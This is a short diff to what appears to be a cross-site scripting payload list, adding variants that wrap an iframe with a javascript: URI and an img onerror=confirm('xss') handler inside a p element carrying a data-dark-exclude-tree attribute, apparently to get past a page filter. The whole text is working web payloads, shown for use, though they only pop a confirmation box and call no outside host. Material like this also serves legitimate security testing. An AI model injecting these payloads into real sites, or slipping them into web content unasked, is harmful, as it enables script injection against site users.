@@ -6,6 +6,10 @@
 
     <iframe src=\"javascript:`<img src=x onerror=confirm('xss')>`\"></iframe>
 
+    OR
+
+    <p data-dark-exclude-tree=\"\"><iframe src=\"javascript:`<img src=x onerror=confirm('xss')>`\"></iframe></p>
+
 
 
   # using single qoute :
@@ -13,6 +17,10 @@
   XSS PAYLOAD : 
 
     <iframe src=\"javascript:'<img src=x onerror=confirm(/xss/)>'\"></iframe>
+
+    OR
+
+    <p data-dark-exclude-tree=\"\"><iframe src=\"javascript:'<img src=x onerror=confirm(/xss/)>'\"></iframe></p>
 
 
 ﻿
